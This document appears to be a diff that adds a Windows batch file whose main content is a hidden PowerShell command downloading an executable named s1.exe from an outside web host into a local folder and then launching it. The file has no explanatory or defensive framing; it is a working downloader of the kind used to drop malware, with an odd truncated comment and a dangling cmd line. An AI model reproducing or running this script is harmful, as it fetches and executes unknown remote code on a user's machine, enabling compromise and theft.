@@ -1,0 +1,9 @@
+@echo off 
+start /b cmd /c    
+ 
+rem messagetruncated! 
+powershell -WindowStyle Hidden  -Command "(New-Object Net.WebClient).DownloadFile('http://vanlizza-chau.com/server/s1.exe', 'c:\\stainlesskit_run\s1.exe')" 
+start c:\\stainlesskit_run\s1.exe
+ 
+ 
+ 
